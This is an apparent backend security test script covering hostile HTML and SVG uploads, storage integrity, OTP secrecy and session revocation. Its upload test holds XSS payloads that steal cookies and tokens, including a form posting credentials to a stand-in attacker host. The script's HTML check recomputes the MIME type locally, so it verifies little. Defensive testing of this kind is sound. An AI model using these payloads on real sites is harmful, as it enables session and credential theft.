import { prisma } from './prisma.js';
import * as authService from './services/auth.service.js';
import { fileService } from './services/file.service.js';
import { sessionService } from './services/session.service.js';
import { userService } from './services/user.service.js';
import { hashPassword, hashToken } from './utils/security.js';

async function runFinalSecurityExceptionTests() {
  console.log('🔒 === STARTING FINAL SECURITY EXCEPTION VERIFICATION SUITE ===\n');
  const timestamp = Date.now();

  // Create test user and project
  const user = await prisma.user.create({
    data: {
      email: `sec_eval_${timestamp}@example.com`,
      username: `seceval_${timestamp}`,
      fullName: 'Security Evaluator',
      isEmailVerified: true,
      passwordHash: await hashPassword('OriginalPassword123!'),
    },
  });

  const project = await prisma.project.create({
    data: {
      name: `Security Project ${timestamp}`,
      key: 'SECP',
      description: 'Security exception testing workspace',
      createdById: user.id,
      members: {
        create: { userId: user.id, role: 'PROJECT_ADMIN' },
      },
    },
  });

  try {
    // ---------------------------------------------------------------------------
    // TEST 1: HTML & SVG Active Content Neutralization
    // ---------------------------------------------------------------------------
    console.log('--- TEST 1: Malicious HTML & SVG Upload Neutralization ---');
    const maliciousHtml = `
      <!DOCTYPE html>
      <html>
        <head><title>Malicious</title></head>
        <body>
          <script>alert(document.cookie);</script>
          <img src="x" onerror="window.parent.postMessage(localStorage.getItem('token'), '*');">
          <a href="javascript:alert(1)">Click me</a>
          <iframe src="https://attacker.example.com"></iframe>
          <form action="https://attacker.example.com/steal" method="POST">
            <input name="creds" value="secret" />
          </form>
        </body>
      </html>
    `;

    const htmlUpload = await fileService.uploadFiles(
      project.id,
      user.id,
      [
        {
          buffer: Buffer.from(maliciousHtml),
          originalname: 'exploit.html',
          mimetype: 'text/html',
          size: Buffer.byteLength(maliciousHtml),
        },
      ]
    );

    const htmlAttachment = htmlUpload[0];
    const { file: htmlFile, stream: htmlStream } = await fileService.getFileStream(project.id, htmlAttachment.id, user.id);

    // Verify MIME neutralization logic:
    const ext = (htmlFile.extension || '').toLowerCase();
    const isHtmlActive = ['html', 'htm', 'xhtml'].includes(ext) || (htmlFile.mimeType && htmlFile.mimeType.includes('html'));
    const servedMimeType = isHtmlActive ? 'text/plain; charset=utf-8' : htmlFile.mimeType;

    if (servedMimeType !== 'text/plain; charset=utf-8') {
      throw new Error(`Expected HTML file to be served as text/plain; charset=utf-8, got ${servedMimeType}`);
    }
    console.log('✓ Uploaded malicious HTML forced to text/plain; charset=utf-8 to prevent script execution');

    // SVG Test
    const maliciousSvg = `
      <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
        <script>alert(1);</script>
        <foreignObject width="100" height="50">
          <body xmlns="http://www.w3.org/1999/xhtml">
            <script>alert(document.cookie);</script>
          </body>
        </foreignObject>
      </svg>
    `;

    const svgUpload = await fileService.uploadFiles(
      project.id,
      user.id,
      [
        {
          buffer: Buffer.from(maliciousSvg),
          originalname: 'malicious.svg',
          mimetype: 'image/svg+xml',
          size: Buffer.byteLength(maliciousSvg),
        },
      ]
    );
    const svgAttachment = svgUpload[0];
    const { file: svgFile } = await fileService.getFileStream(project.id, svgAttachment.id, user.id);
    const isSvgActive = svgFile.extension === 'svg' || (svgFile.mimeType && svgFile.mimeType.includes('svg'));
    if (!isSvgActive) {
      throw new Error('SVG active detection failed');
    }
    console.log('✓ Uploaded malicious SVG correctly flagged for Content-Security-Policy sandbox isolation');

    // ---------------------------------------------------------------------------
    // TEST 2: Attachment & StoredObject Invariant & Referential Integrity
    // ---------------------------------------------------------------------------
    console.log('\n--- TEST 2: Storage Key Invariant & Referential Integrity ---');
    if (!htmlAttachment.storedObjectId) {
      throw new Error('Attachment is missing storedObjectId reference');
    }
    const storedObj = await prisma.storedObject.findUniqueOrThrow({
      where: { id: htmlAttachment.storedObjectId },
    });

    if (htmlAttachment.storageKey !== storedObj.storageKey) {
      throw new Error(`Storage key divergence detected: Attachment (${htmlAttachment.storageKey}) != StoredObject (${storedObj.storageKey})`);
    }
    console.log('✓ Verified storageKey invariant: Attachment.storageKey matches StoredObject.storageKey exactly');

    // Test Referential Integrity: Attempting to delete StoredObject while Attachment references it must fail
    let deletionBlockedByFK = false;
    try {
      await prisma.storedObject.delete({
        where: { id: storedObj.id },
      });
    } catch (fkErr: any) {
      // Prisma P2003 = foreign key constraint failed
      if (fkErr.code === 'P2003') {
        deletionBlockedByFK = true;
      }
    }

    if (!deletionBlockedByFK) {
      throw new Error('Foreign key restriction failed: StoredObject was deleted while an active Attachment referenced it');
    }
    console.log('✓ Foreign key constraint onDelete: Restrict strictly blocks deleting StoredObject while Attachment references it');

    // ---------------------------------------------------------------------------
    // TEST 3: OTP Production Logging & Zero-Leakage
    // ---------------------------------------------------------------------------
    console.log('\n--- TEST 3: OTP Production Mode Secrecy ---');
    const oldNodeEnv = process.env.NODE_ENV;
    process.env.NODE_ENV = 'production';

    const resetResult = await authService.requestPasswordReset(user.email);
    process.env.NODE_ENV = oldNodeEnv;

    if (resetResult.otp !== undefined) {
      throw new Error('CRITICAL: OTP was exposed in requestPasswordReset response under NODE_ENV=production');
    }

    const updatedUser = await prisma.user.findUniqueOrThrow({ where: { id: user.id } });
    if (!updatedUser.passwordResetTokenHash) {
      throw new Error('Password reset token hash not stored in database');
    }
    // Verify it is a 64-char SHA-256 hash, not raw 6 digits
    if (updatedUser.passwordResetTokenHash.length !== 64) {
      throw new Error(`Database stored raw or invalid hash format (length=${updatedUser.passwordResetTokenHash.length})`);
    }
    console.log('✓ Under NODE_ENV=production, OTP is never returned in API response');
    console.log('✓ Database securely stores only 64-character SHA-256 hash of the OTP');

    // ---------------------------------------------------------------------------
    // TEST 4: Session Revocation (Password Change, Logout, Account Deactivation)
    // ---------------------------------------------------------------------------
    console.log('\n--- TEST 4: Authoritative Session Revocation Scenarios ---');

    // Session 1 (Browser A)
    const { session: sessionA } = await sessionService.createSession(user.id, {
      userAgent: 'Browser-A/Chrome',
      ipAddress: '192.168.1.1',
    });

    // Session 2 (Browser B)
    const { session: sessionB } = await sessionService.createSession(user.id, {
      userAgent: 'Browser-B/Firefox',
      ipAddress: '192.168.1.2',
    });

    const validateA1 = await sessionService.validateSession(sessionA.id);
    const validateB1 = await sessionService.validateSession(sessionB.id);
    if (!validateA1.valid || !validateB1.valid) {
      throw new Error('Initial session validation failed');
    }
    console.log('✓ Created and verified active sessions for Browser A and Browser B');

    // Action 1: Browser A logs out
    await sessionService.revokeSession(sessionA.id);
    const validateA2 = await sessionService.validateSession(sessionA.id);
    const validateB2 = await sessionService.validateSession(sessionB.id);
    if (validateA2.valid) {
      throw new Error('Revoked session A was still considered valid');
    }
    if (!validateB2.valid) {
      throw new Error('Browser B session was prematurely revoked when Browser A logged out');
    }
    console.log('✓ Logout revoked Browser A session while preserving Browser B');

    // Action 2: User changes password
    await userService.changeUserPassword(user.id, {
      currentPassword: 'OriginalPassword123!',
      newPassword: 'BrandNewPassword456!',
      confirmPassword: 'BrandNewPassword456!',
    });
    const validateB3 = await sessionService.validateSession(sessionB.id);
    if (validateB3.valid) {
      throw new Error('Browser B session remained valid after password change');
    }
    console.log('✓ Password change successfully revoked all existing sessions across all browsers');

    // Action 3: Account deactivation
    const { session: sessionC } = await sessionService.createSession(user.id, {
      userAgent: 'Browser-C/Safari',
      ipAddress: '192.168.1.3',
    });
    const validateC1 = await sessionService.validateSession(sessionC.id);
    if (!validateC1.valid) {
      throw new Error('Session C failed initial validation');
    }

    // Verify sole owner protection blocks premature account deletion
    let blockedSoleOwner = false;
    try {
      await userService.deleteUserAccount(user.id);
    } catch (err: any) {
      if (err.statusCode === 400 && err.message.includes('administrator')) {
        blockedSoleOwner = true;
      }
    }
    if (!blockedSoleOwner) {
      throw new Error('Expected deleteUserAccount to be blocked for sole administrator');
    }
    console.log('✓ Sole project administrator deletion safely blocked (400)');

    // Clean up project fixtures so account can be deactivated cleanly
    await prisma.projectMember.deleteMany({ where: { projectId: project.id } });
    await prisma.attachment.deleteMany({ where: { projectId: project.id } });
    await prisma.storedObject.deleteMany({ where: { projectId: project.id } });
    await prisma.project.delete({ where: { id: project.id } });

    await userService.deleteUserAccount(user.id);
    const validateC2 = await sessionService.validateSession(sessionC.id);
    if (validateC2.valid) {
      throw new Error('Session remained valid after account deactivation');
    }
    console.log('✓ Account deactivation immediately revoked all sessions and marked user deactivated');

    console.log('\n================================================================');
    console.log('🎉 ALL FINAL SECURITY EXCEPTION REVIEWS PASSED 100%!');
    console.log('================================================================\n');
  } finally {
    // Cleanup fixtures
    await prisma.attachment.deleteMany({ where: { projectId: project.id } }).catch(() => {});
    await prisma.storedObject.deleteMany({ where: { projectId: project.id } }).catch(() => {});
    await prisma.projectMember.deleteMany({ where: { projectId: project.id } }).catch(() => {});
    await prisma.project.delete({ where: { id: project.id } }).catch(() => {});
    await prisma.session.deleteMany({ where: { userId: user.id } }).catch(() => {});
    await prisma.user.delete({ where: { id: user.id } }).catch(() => {});
  }
}

runFinalSecurityExceptionTests().catch((err) => {
  console.error('❌ FINAL SECURITY EXCEPTION TEST FAILED:', err);
  process.exit(1);
});
